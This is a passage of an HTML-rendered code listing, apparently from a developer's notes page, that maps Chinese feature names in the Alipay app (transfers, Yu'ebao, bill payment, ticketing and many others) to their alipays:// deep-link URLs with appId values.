class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br></pre></td><td class="code"><pre><span class="line">收款:</span><br><span class="line">alipays://platformapi/startapp?appId=20000123</span><br><span class="line">扫码：</span><br><span class="line">alipays://platformapi/startapp?saId=10000007</span><br><span class="line">余额宝:</span><br><span class="line">alipays://platformapi/startapp?appId=20000032</span><br><span class="line">转账:</span><br><span class="line">alipays://platformapi/startapp?appId=20000221</span><br><span class="line">租房：</span><br><span class="line">alipays://platformapi/startapp?appId=60000125</span><br><span class="line">城市服务：</span><br><span class="line">alipays://platformapi/startapp?appId=20000178</span><br><span class="line">手机充值：</span><br><span class="line">alipays://platformapi/startapp?appId=10000003</span><br><span class="line">快递查询：</span><br><span class="line">alipays://platformapi/startapp?appId=20000754</span><br><span class="line">我的快递-寄件平台：</span><br><span class="line">alipays://platformapi/startapp?appId=60000146</span><br><span class="line">我的二维码:</span><br><span class="line">alipays://platformapi/startapp?appId=20000085</span><br><span class="line">蚂蚁庄园:</span><br><span class="line">alipays://platformapi/startapp?appId=66666674</span><br><span class="line">蚂蚁森林：</span><br><span class="line">alipays://platformapi/startapp?appId=60000002</span><br><span class="line">我的公益：</span><br><span class="line">alipays://platformapi/startapp?appId=66666867</span><br><span class="line">运动：</span><br><span class="line">alipays://platformapi/startapp?appId=20000869</span><br><span class="line">蚂蚁借呗：</span><br><span class="line">alipays://platformapi/startapp?appId=20000180</span><br><span class="line">个人主页：</span><br><span class="line">alipays://platformapi/startapp?appId=20000186</span><br><span class="line">个人名片:</span><br><span class="line">alipays://platformapi/startapp?appId=20000228</span><br><span class="line">信用卡还款：</span><br><span class="line">alipays://platformapi/startapp?appId=09999999</span><br><span class="line">爱心捐赠：</span><br><span class="line">alipays://platformapi/startapp?appId=10000009</span><br><span class="line">彩票：</span><br><span class="line">alipays://platformapi/startapp?appId=10000011</span><br><span class="line">转账：</span><br><span class="line">alipays://platformapi/startapp?appId=09999988</span><br><span class="line">花呗：</span><br><span class="line">alipays://platformapi/startapp?appId=20000199</span><br><span class="line">生活缴费：</span><br><span class="line">alipays://platformapi/startapp?appId=20000193</span><br><span class="line">芝麻信用:</span><br><span class="line">alipays://platformapi/startapp?appId=20000118</span><br><span class="line">位置:</span><br><span class="line">alipays://platformapi/startapp?appId=20000226</span><br><span class="line">卡券:</span><br><span class="line">alipays://platformapi/startapp?appId=20000227</span><br><span class="line">饿了么外卖:</span><br><span class="line">alipays://platformapi/startapp?appId=20000120</span><br><span class="line">淘票票电影:</span><br><span class="line">alipays://platformapi/startapp?appId=20000131</span><br><span class="line">火车票:</span><br><span class="line">alipays://platformapi/startapp?appId=20000143</span><br><span class="line">汇率换算:</span><br><span class="line">alipays://platformapi/startapp?appId=20000150</span><br><span class="line">理财小工具：</span><br><span class="line">alipays://platformapi/startapp?appId=20000161</span><br><span class="line">羊城通充值：</span><br><span class="line">alipays://platformapi/startapp?appId=20000162</span><br><span class="line">收货地址:</span><br><span class="line">alipays://platformapi/startapp?appId=20000714</span><br><span class="line">隐私：</span><br><span class="line">alipays://platformapi/startapp?appId=20000723</span><br><span class="line">通用：</span><br><span class="line">alipays://platformapi/startapp?appId=20000724</span><br><span class="line">充值中心：</span><br><span class="line">alipays://platformapi/startapp?appId=20000987</span><br><span class="line">校园一卡通：</span><br><span class="line">alipays://platformapi/startapp?appId=2013062600000474</span><br><span class="line">淘宝：</span><br><span class="line">alipays://platformapi/startapp?appId=2013082800000932</span><br><span class="line">教育缴费：</span><br><span class="line">alipays://platformapi/startapp?appId=2014021200003129</span><br><span class="line">ofo小黄车：</span><br><span class="line">alipays://platformapi/startapp?appId=2017041206668232</span><br><span class="line">高德打车：</span><br><span class="line">alipays://platformapi/startapp?appId=2018070960585195</span><br><span class="line">蚂蚁宝卡：</span><br><span class="line">alipays://platformapi/startapp?appId=60000057</span><br><span class="line">地铁购票：</span><br><span class="line">alipays://platformapi/startapp?appId=60000070</span><br><span class="line">AA收款：</span><br><span class="line">alipays://platformapi/startapp?appId=60000154</span><br><span class="line">AA收款:</span><br><span class="line">alipays://platformapi/startapp?appId=66666696</span><br><span class="line">AA收款：</span><br><span class="line">alipays://platformapi/startapp?appId=9000258</span><br><span class="line">共享单车：</span><br><span class="line">alipays://platformapi/startapp?appId=60000155</span><br><span class="line">余利宝:</span><br><span class="line">alipays://platformapi/startapp?appId=66666708</span><br><span class="line">收钱码服务:</span><br><span class="line">alipays://platformapi/startapp?appId=66666714</span><br><span class="line">大麦演出票：</span><br><span class="line">alipays://platformapi/startapp?appId=66666753</span><br><span class="line">口碑签到：</span><br><span class="line">alipays://platformapi/startapp?appId=66666776</span><br><span class="line">信用生活：</span><br><span class="line">alipays://platformapi/startapp?appId=66666786</span><br><span class="line">支付宝月账单：</span><br><span class="line">alipays://platformapi/startapp?appId=66666798</span><br><span class="line">天猫购物：</span><br><span class="line">alipays://platformapi/startapp?appId=66666820</span><br><span class="line">绿色城市：</span><br><span class="line">alipays://platformapi/startapp?appId=66666824</span><br><span class="line">还贷管家：</span><br><span class="line">alipays://platformapi/startapp?appId=66666819</span><br><span class="line">股票:</span><br><span class="line">alipays://platformapi/startapp?appId=20000134</span><br><span class="line">淘票票：</span><br><span class="line">alipays://platformapi/startapp?appId=68687093</span><br><span class="line">淘票票H5票券：</span><br><span class="line">alipays://platformapi/startapp?appId=68687095</span><br><span class="line">淘票票H5购票：</span><br><span class="line">alipays://platformapi/startapp?appId=68687096</span><br><span class="line">收款：</span><br><span class="line">alipays://platformapi/startapp?appId=20000674</span><br><span class="line">余额宝：</span><br><span class="line">alipays://platformapi/startapp?appId=60000126</span><br><span class="line">余额宝:</span><br><span class="line">alipays://platformapi/startapp?appId=77700124</span><br><span class="line">话费卡转让：</span><br><span class="line">alipays://platformapi/startapp?appId=10000033</span><br><span class="line">关于：</span><br><span class="line">alipays://platformapi/startapp?appId=10000110</span><br><span class="line">天猫：</span><br><span class="line">alipays://platformapi/startapp?appId=20000000</span><br><span class="line">账单：</span><br><span class="line">alipays://platformapi/startapp?appId=20000003</span><br><span class="line">银行卡:</span><br><span class="line">alipays://platformapi/startapp?appId=20000014</span><br><span class="line">账户详情:</span><br><span class="line">alipays://platformapi/startapp?appId=20000019</span><br><span class="line">支付设置:</span><br><span class="line">alipays://platformapi/startapp?appId=20000024</span><br><span class="line">实名认证:</span><br><span class="line">alipays://platformapi/startapp?appId=20000038</span><br><span class="line">反馈:</span><br><span class="line">alipays://platformapi/startapp?appId=20000049</span><br><span class="line">上银汇款:</span><br><span class="line">alipays://platformapi/startapp?appId=20000078</span><br><span class="line">生活号:</span><br><span class="line">alipays://platformapi/startapp?appId=20000101</span><br><span class="line">出境:</span><br><span class="line">alipays://platformapi/startapp?appId=20000107</span><br><span class="line">安全设置:</span><br><span class="line">alipays://platformapi/startapp?appId=20000113</span><br><span class="line">亲情号:</span><br><span class="line">alipays://platformapi/startapp?appId=20000132</span><br><span class="line">火车票机票:</span><br><span class="line">alipays://platformapi/startapp?appId=20000135</span><br><span class="line">飞猪酒店:</span><br><span class="line">alipays://platformapi/startapp?appId=20000139</span><br><span class="line">娱乐宝:</span><br><span class="line">alipays://platformapi/startapp?appId=20000142</span><br><span class="line">海外交通卡:</span><br><span class="line">alipays://platformapi/startapp?appId=20000152</span><br><span class="line">游戏中心：</span><br><span class="line">alipays://platformapi/startapp?appId=20000153</span><br><span class="line">国际机票：</span><br><span class="line">alipays://platformapi/startapp?appId=20000157</span><br><span class="line">蚂蚁会员：</span><br><span class="line">alipays://platformapi/startapp?appId=20000160</span><br><span class="line">定期：</span><br><span class="line">alipays://platformapi/startapp?appId=20000165</span><br><span class="line">记账本：</span><br><span class="line">alipays://platformapi/startapp?appId=20000168</span><br><span class="line">手势：</span><br><span class="line">alipays://platformapi/startapp?appId=20000184</span><br><span class="line">H5公共资源：</span><br><span class="line">alipays://platformapi/startapp?appId=20000196</span><br><span class="line">H5运营活动资源包：</span><br><span class="line">alipays://platformapi/startapp?appId=20000202</span><br><span class="line">亲情圈:</span><br><span class="line">alipays://platformapi/startapp?appId=20000205</span><br><span class="line">黄金:</span><br><span class="line">alipays://platformapi/startapp?appId=20000218</span><br><span class="line">蚂蚁乐驾:</span><br><span class="line">alipays://platformapi/startapp?appId=20000241</span><br><span class="line">总资产:</span><br><span class="line">alipays://platformapi/startapp?appId=20000243</span><br><span class="line">收藏:</span><br><span class="line">alipays://platformapi/startapp?appId=20000245</span><br><span class="line">活动收款:</span><br><span class="line">alipays://platformapi/startapp?appId=20000259</span><br><span class="line">信用卡账单:</span><br><span class="line">alipays://platformapi/startapp?appId=20000266</span><br><span class="line">数字证书:</span><br><span class="line">alipays://platformapi/startapp?appId=20000298</span><br><span class="line">暗号:</span><br><span class="line">alipays://platformapi/startapp?appId=20000307</span><br><span class="line">支付宝账号:</span><br><span class="line">alipays://platformapi/startapp?appId=20000308</span><br><span class="line">1688好货源:</span><br><span class="line">alipays://platformapi/startapp?appId=20000522</span><br><span class="line">活动群:</span><br><span class="line">alipays://platformapi/startapp?appId=20000672</span><br><span class="line">我的客服:</span><br><span class="line">alipays://platformapi/startapp?appId=20000691</span><br><span class="line">淘宝会员名</span><br><span class="line">alipays://platformapi/startapp?appId=20000710</span><br><span class="line">蚂蚁微客：</span><br><span class="line">alipays://platformapi/startapp?appId=20000735</span><br><span class="line">在线理赔：</span><br><span class="line">alipays://platformapi/startapp?appId=20000750</span><br><span class="line">悄悄话：</span><br><span class="line">alipays://platformapi/startapp?appId=20000752</span><br><span class="line">滴滴出行：</span><br><span class="line">alipays://platformapi/startapp?appId=20000778</span><br><span class="line">小视频：</span><br><span class="line">alipays://platformapi/startapp?appId=20000780</span><br><span class="line">圈存机：</span><br><span class="line">alipays://platformapi/startapp?appId=20000791</span><br><span class="line">基金：</span><br><span class="line">alipays://platformapi/startapp?appId=20000793</span><br><span class="line">地铁票购票：</span><br><span class="line">alipays://platformapi/startapp?appId=20000796</span><br><span class="line">新的朋友：</span><br><span class="line">alipays://platformapi/startapp?appId=20000820</span><br><span class="line">云客服：</span><br><span class="line">alipays://platformapi/startapp?appId=20000827</span><br><span class="line">淘票票H5票券：</span><br><span class="line">alipays://platformapi/startapp?appId=20000834</span><br><span class="line">人脸识别：</span><br><span class="line">alipays://platformapi/startapp?appId=20000841</span><br><span class="line">大学生活：</span><br><span class="line">alipays://platformapi/startapp?appId=20000859</span><br><span class="line">国内机票逆向：</span><br><span class="line">alipays://platformapi/startapp?appId=20000877</span><br><span class="line">境外上网：</span><br><span class="line">alipays://platformapi/startapp?appId=20000895</span><br><span class="line">网商贷：</span><br><span class="line">alipays://platformapi/startapp?appId=20000899</span><br><span class="line">充值助手：</span><br><span class="line">alipays://platformapi/startapp?appId=20000905</span><br><span class="line">生活号：</span><br><span class="line">alipays://platformapi/startapp?appId=20000909</span><br><span class="line">网商银行：</span><br><span class="line">alipays://platformapi/startapp?appId=20000913</span><br><span class="line">社交H5：</span><br><span class="line">alipays://platformapi/startapp?appId=20000917</span><br><span class="line">车主服务：</span><br><span class="line">alipays://platformapi/startapp?appId=20000919</span><br><span class="line">发票管家：</span><br><span class="line">alipays://platformapi/startapp?appId=20000920</span><br><span class="line">汽车票：</span><br><span class="line">alipays://platformapi/startapp?appId=20000922</span><br><span class="line">口碑卡券：</span><br><span class="line">alipays://platformapi/startapp?appId=20000923</span><br><span class="line">蚂蚁保险：</span><br><span class="line">alipays://platformapi/startapp?appId=20000936</span><br><span class="line">支付结果页口碑推荐：</span><br><span class="line">alipays://platformapi/startapp?appId=20000939</span><br><span class="line">生活圈：</span><br><span class="line">alipays://platformapi/startapp?appId=20000943</span><br><span class="line">群聊：</span><br><span class="line">alipays://platformapi/startapp?appId=20000951</span><br><span class="line">有财教练：</span><br><span class="line">alipays://platformapi/startapp?appId=20000971</span><br><span class="line">口碑我的订单：</span><br><span class="line">alipays://platformapi/startapp?appId=20000975</span><br><span class="line">心愿储蓄-余额宝：</span><br><span class="line">alipays://platformapi/startapp?appId=20000981</span><br><span class="line">体育服务：</span><br><span class="line">alipays://platformapi/startapp?appId=20000988</span><br><span class="line">H5在线买单：</span><br><span class="line">alipays://platformapi/startapp?appId=20000989</span><br><span class="line">商家动态：</span><br><span class="line">alipays://platformapi/startapp?appId=20000991</span><br><span class="line">安全课堂：</span><br><span class="line">alipays://platformapi/startapp?appId=20001010</span><br><span class="line">照片：</span><br><span class="line">alipays://platformapi/startapp?appId=20001021</span><br><span class="line">拍摄：</span><br><span class="line">alipays://platformapi/startapp?appId=20001022</span><br><span class="line">财富交易组件：</span><br><span class="line">alipays://platformapi/startapp?appId=20001045</span><br><span class="line">大学充值缴费：</span><br><span class="line">alipays://platformapi/startapp?appId=20001091</span><br><span class="line">安全备忘：</span><br><span class="line">alipays://platformapi/startapp?appId=20001116</span><br><span class="line">一字千金：</span><br><span class="line">alipays://platformapi/startapp?appId=20001121</span><br><span class="line">送福卡：</span><br><span class="line">alipays://platformapi/startapp?appId=20002018</span><br><span class="line">小程序收藏：</span><br><span class="line">alipays://platformapi/startapp?appId=2018072560844004</span><br><span class="line">专属优惠频道：</span><br><span class="line">alipays://platformapi/startapp?appId=60000006</span><br><span class="line">国内机票React正向：</span><br><span class="line">alipays://platformapi/startapp?appId=60000007</span><br><span class="line">手艺人：</span><br><span class="line">alipays://platformapi/startapp?appId=60000008</span><br><span class="line">社交金融H5：</span><br><span class="line">alipays://platformapi/startapp?appId=60000010</span><br><span class="line">安全设备：</span><br><span class="line">alipays://platformapi/startapp?appId=60000011</span><br><span class="line">中小学：</span><br><span class="line">alipays://platformapi/startapp?appId=60000012</span><br><span class="line">口碑在线购买H5：</span><br><span class="line">alipays://platformapi/startapp?appId=60000014</span><br><span class="line">账单关联业务-h5：</span><br><span class="line">alipays://platformapi/startapp?appId=60000016</span><br><span class="line">基金组合：</span><br><span class="line">alipays://platformapi/startapp?appId=60000018</span><br><span class="line">蚂蚁保险：</span><br><span class="line">alipays://platformapi/startapp?appId=60000023</span><br><span class="line">商圈：</span><br><span class="line">alipays://platformapi/startapp?appId=60000026</span><br><span class="line">月度榜单：</span><br><span class="line">alipays://platformapi/startapp?appId=60000029</span><br><span class="line">电子证件：</span><br><span class="line">alipays://platformapi/startapp?appId=60000032</span><br><span class="line">in定制印品：</span><br><span class="line">alipays://platformapi/startapp?appId=60000033</span><br><span class="line">大牌抢购：</span><br><span class="line">alipays://platformapi/startapp?appId=60000039</span><br><span class="line">未来酒店：</span><br><span class="line">alipays://platformapi/startapp?appId=60000040</span><br><span class="line">支付成功页权益区：</span><br><span class="line">alipays://platformapi/startapp?appId=60000044</span><br><span class="line">社交聚合H5：</span><br><span class="line">alipays://platformapi/startapp?appId=60000050</span><br><span class="line">天天有料：</span><br><span class="line">alipays://platformapi/startapp?appId=60000071</span><br><span class="line">VIP预约服务：</span><br><span class="line">alipays://platformapi/startapp?appId=60000076</span><br><span class="line">优酷：</span><br><span class="line">alipays://platformapi/startapp?appId=60000077</span><br><span class="line">商家服务：</span><br><span class="line">alipays://platformapi/startapp?appId=60000081</span><br><span class="line">Mini 花呗：</span><br><span class="line">alipays://platformapi/startapp?appId=60000091</span><br><span class="line">电子公交卡：</span><br><span class="line">alipays://platformapi/startapp?appId=60000098</span><br><span class="line">奖励金：</span><br><span class="line">alipays://platformapi/startapp?appId=60000103</span><br><span class="line">银行卡：</span><br><span class="line">alipays://platformapi/startapp?appId=60000105</span><br><span class="line">定期+：</span><br><span class="line">alipays://platformapi/startapp?appId=60000119</span><br><span class="line">福员外：</span><br><span class="line">alipays://platformapi/startapp?appId=60000120</span><br><span class="line">投票：</span><br><span class="line">alipays://platformapi/startapp?appId=60000121</span><br><span class="line">淘票票H5购票：</span><br><span class="line">alipays://platformapi/startapp?appId=60000130</span><br><span class="line">质押资产：</span><br><span class="line">alipays://platformapi/startapp?appId=60000132</span><br><span class="line">外币兑换：</span><br><span class="line">alipays://platformapi/startapp?appId=60000134</span><br><span class="line">飞猪汽车票新版：</span><br><span class="line">alipays://platformapi/startapp?appId=60000135</span><br><span class="line">飞猪国内机票：</span><br><span class="line">alipays://platformapi/startapp?appId=60000138</span><br><span class="line">医疗健康：</span><br><span class="line">alipays://platformapi/startapp?appId=60000141</span><br><span class="line">财富运营承接中间页：</span><br><span class="line">alipays://platformapi/startapp?appId=60000142</span><br><span class="line">冻结金额：</span><br><span class="line">alipays://platformapi/startapp?appId=60000145</span><br><span class="line">h5券详情页面：</span><br><span class="line">alipays://platformapi/startapp?appId=60000147</span><br><span class="line">财富号：</span><br><span class="line">alipays://platformapi/startapp?appId=60000148</span><br><span class="line">我的口碑：</span><br><span class="line">alipays://platformapi/startapp?appId=60000150</span><br><span class="line">快消优惠：</span><br><span class="line">alipays://platformapi/startapp?appId=60000151</span><br><span class="line">支付签约中心:</span><br><span class="line">alipays://platformapi/startapp?appId=60000157</span><br><span class="line">借呗任务平台:</span><br><span class="line">alipays://platformapi/startapp?appId=60000158</span><br><span class="line">周周乐:</span><br><span class="line">alipays://platformapi/startapp?appId=60000161</span><br><span class="line">表情搜索:</span><br><span class="line">alipays://platformapi/startapp?appId=60000163</span><br><span class="line">小程序:</span><br><span class="line">alipays://platformapi/startapp?appId=66666666</span><br><span class="line">会员卡:</span><br><span class="line">alipays://platformapi/startapp?appId=66666667</span><br><span class="line">口碑资源加速二:</span><br><span class="line">alipays://platformapi/startapp?appId=66666669</span><br><span class="line">国际资源加速一:</span><br><span class="line">alipays://platformapi/startapp?appId=66666670</span><br><span class="line">新消息通知:</span><br><span class="line">alipays://platformapi/startapp?appId=66666672</span><br><span class="line">风险评测:</span><br><span class="line">alipays://platformapi/startapp?appId=66666673</span><br><span class="line">口碑生活圈问答:</span><br><span class="line">alipays://platformapi/startapp?appId=66666675</span><br><span class="line">账单详情:</span><br><span class="line">alipays://platformapi/startapp?appId=66666676</span><br><span class="line">亚博游戏:</span><br><span class="line">alipays://platformapi/startapp?appId=66666677</span><br><span class="line">AR:</span><br><span class="line">alipays://platformapi/startapp?appId=66666678</span><br><span class="line">新人气榜单:</span><br><span class="line">alipays://platformapi/startapp?appId=66666679</span><br><span class="line">福卡回忆:</span><br><span class="line">alipays://platformapi/startapp?appId=66666682</span><br><span class="line">集分宝:</span><br><span 